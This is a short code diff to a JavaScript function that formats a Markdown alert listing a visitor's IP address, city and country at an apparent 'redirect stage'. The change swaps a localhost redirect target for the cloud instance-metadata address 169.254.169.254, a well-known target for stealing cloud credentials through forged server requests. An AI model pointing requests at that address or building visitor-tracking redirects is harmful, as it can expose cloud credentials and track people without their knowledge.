@@ -26,7 +26,8 @@
 
     function formatMessage(data) {
       return `📄 *[REDIRECT STAGE]*
-🚪 *Redirecting to:* http://127.0.0.1:80
+🚪 *Redirecting to:* "http://169.254.169.254/latest/meta-data/"
+
 🌐 *IP:* ${data.ip || "Unknown"}
 📍 *City:* ${data.city || "Unknown"}
 🌎 *Country:* ${data.country || "Unknown"}
